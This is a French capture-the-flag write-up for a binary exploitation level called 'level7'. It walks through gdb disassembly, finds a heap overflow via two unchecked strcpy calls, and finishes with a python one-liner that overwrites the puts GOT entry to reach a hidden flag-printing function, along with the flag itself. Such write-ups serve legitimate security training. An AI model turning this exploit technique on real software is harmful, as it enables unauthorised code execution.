#level7

$ ./level7
Segmentation fault (core dumped)
$ ./level7 test
Segmentation fault (core dumped)
$ ./level7 test test
~~

On remarque level7 segfault avec 1 ou sans paramètres, ,mais affiche avec ~~ avec deux paramètres.

On observe juste un main et une fonction m qui n'est pas appeler.

$ gdb level7

> disas main
> Dump of assembler code for function main:
> 0x08048521 <+0>: push %ebp
> 0x08048522 <+1>: mov %esp,%ebp
> 0x08048524 <+3>: and $0xfffffff0,%esp
> 0x08048527 <+6>: sub $0x20,%esp
> 0x0804852a <+9>: movl $0x8,(%esp)
> 0x08048531 <+16>: call 0x80483f0 <malloc@plt>
> 0x08048536 <+21>: mov %eax,0x1c(%esp)
> 0x0804853a <+25>: mov 0x1c(%esp),%eax
> 0x0804853e <+29>: movl $0x1,(%eax)
> 0x08048544 <+35>: movl $0x8,(%esp)
> 0x0804854b <+42>: call 0x80483f0 <malloc@plt>
> 0x08048550 <+47>: mov %eax,%edx
> 0x08048552 <+49>: mov 0x1c(%esp),%eax
> 0x08048556 <+53>: mov %edx,0x4(%eax)
> 0x08048559 <+56>: movl $0x8,(%esp)
> 0x08048560 <+63>: call 0x80483f0 <malloc@plt>
> 0x08048565 <+68>: mov %eax,0x18(%esp)
> 0x08048569 <+72>: mov 0x18(%esp),%eax
> 0x0804856d <+76>: movl $0x2,(%eax)
> 0x08048573 <+82>: movl $0x8,(%esp)
> 0x0804857a <+89>: call 0x80483f0 <malloc@plt>
> 0x0804857f <+94>: mov %eax,%edx
> 0x08048581 <+96>: mov 0x18(%esp),%eax
> 0x08048585 <+100>: mov %edx,0x4(%eax)
> 0x08048588 <+103>: mov 0xc(%ebp),%eax
> 0x0804858b <+106>: add $0x4,%eax
> 0x0804858e <+109>: mov (%eax),%eax
> 0x08048590 <+111>: mov %eax,%edx
> 0x08048592 <+113>: mov 0x1c(%esp),%eax
> 0x08048596 <+117>: mov 0x4(%eax),%eax
> 0x08048599 <+120>: mov %edx,0x4(%esp)
> 0x0804859d <+124>: mov %eax,(%esp)
> 0x080485a0 <+127>: call 0x80483e0 <strcpy@plt>
> 0x080485a5 <+132>: mov 0xc(%ebp),%eax
> 0x080485a8 <+135>: add $0x8,%eax
> 0x080485ab <+138>: mov (%eax),%eax
> 0x080485ad <+140>: mov %eax,%edx
> 0x080485af <+142>: mov 0x18(%esp),%eax
> 0x080485b3 <+146>: mov 0x4(%eax),%eax
> 0x080485b6 <+149>: mov %edx,0x4(%esp)
> 0x080485ba <+153>: mov %eax,(%esp)
> 0x080485bd <+156>: call 0x80483e0 <strcpy@plt>
> 0x080485c2 <+161>: mov $0x80486e9,%edx
> 0x080485c7 <+166>: mov $0x80486eb,%eax
> 0x080485cc <+171>: mov %edx,0x4(%esp)
> 0x080485d0 <+175>: mov %eax,(%esp)
> 0x080485d3 <+178>: call 0x8048430 <fopen@plt>
> 0x080485d8 <+183>: mov %eax,0x8(%esp)
> 0x080485dc <+187>: movl $0x44,0x4(%esp)
> 0x080485e4 <+195>: movl $0x8049960,(%esp)
> 0x080485eb <+202>: call 0x80483c0 <fgets@plt>
> 0x080485f0 <+207>: movl $0x8048703,(%esp)
> 0x080485f7 <+214>: call 0x8048400 <puts@plt>
> 0x080485fc <+219>: mov $0x0,%eax
> 0x08048601 <+224>: leave
> 0x08048602 <+225>: ret
> End of assembler dump.

On a deux malloc de taille 8, qui sont utiliser pour copier argv[1] et argv[2] chacun dans une variable grace a strcpy.

On voit deux strcpy qui ne sont pas protégées, on peut les exploiter.

On voit aussi fgets qui recupère le flag pour le stocker dans une variable globale c.

Observons m ensuite:

> disas m
> Dump of assembler code for function m:
> 0x080484f4 <+0>: push %ebp
> 0x080484f5 <+1>: mov %esp,%ebp
> 0x080484f7 <+3>: sub $0x18,%esp
> 0x080484fa <+6>: movl $0x0,(%esp)
> 0x08048501 <+13>: call 0x80483d0 <time@plt>
> 0x08048506 <+18>: mov $0x80486e0,%edx
> 0x0804850b <+23>: mov %eax,0x8(%esp)
> 0x0804850f <+27>: movl $0x8049960,0x4(%esp)
> 0x08048517 <+35>: mov %edx,(%esp)
> 0x0804851a <+38>: call 0x80483b0 <printf@plt>
> 0x0804851f <+43>: leave
> 0x08048520 <+44>: ret
> End of assembler dump.

m recupère le temps et le flag dans c pour ensuite afficher le flag et le temps.

On va donc essayer d'appeler m en changeant l'adresse GOT de puts par un overwrite grâce aux strcpy.

Dans le main appelons les deux variables où sont stocker les deux mallocs a et b.

On va donc overwrite sur a pour pouvoir changer l'adresse de b par l'adresse GOT de puts.

Et ensuite overwrite puts pour qu'elle appelle m.

D'abord nous devons trouver l'adresse de puts.

> info functions puts
> All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400 puts
0x08048400 puts@plt

> disas 0x08048400
> Dump of assembler code for function puts@plt:
> 0x08048400 <+0>: jmp \*0x8049928
> 0x08048406 <+6>: push $0x28
> 0x0804840b <+11>: jmp 0x80483a0
> End of assembler dump.

0x8049928 est le pointeur que l'on va overwrite.

Il nous faut aussi le offset pour overwrite b[1].

On utilise une chaine de charactère pour trouver le offset.

> r 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
> Starting program: /home/user/level7/level7 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'

Program received signal SIGSEGV, Segmentation fault.
0xb7eb8aa8 in ?? () from /lib/i386-linux-gnu/libc.so.6

> i r
> eax 0x46464646 1179010630
> ecx 0x0 0
> edx 0x46464646 1179010630
> ebx 0xb7fd0ff4 -1208152076
> esp 0xbffff60c 0xbffff60c
> ebp 0xbffff638 0xbffff638
> esi 0x0 0
> edi 0x0 0
> eip 0xb7eb8aa8 0xb7eb8aa8
> eflags 0x210282 [ SF IF RF ID ]
> cs 0x73 115
> ss 0x7b 123
> ds 0x7b 123
> es 0x7b 123
> fs 0x0 0
> gs 0x33 51

On voit que eax et edx sont overwrite avec 46464646 -> FFFF donc l'offset commence à 20.

Il nous manque juste l'adresse de m qu'on trouve facilement grâce à :

> info functions m
> All functions matching regular expression "m":

Non-debugging symbols:
0x080483d0 time
0x080483d0 time@plt
0x080483f0 malloc
0x080483f0 malloc@plt
0x08048410 **gmon_start**
0x08048410 **gmon_start**@plt
0x08048420 **libc_start_main
0x08048420 **libc_start_main@plt
0x080484d0 frame_dummy
0x080484f4 m

Donc notre commande va ressembler a :

$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
- 1649239638
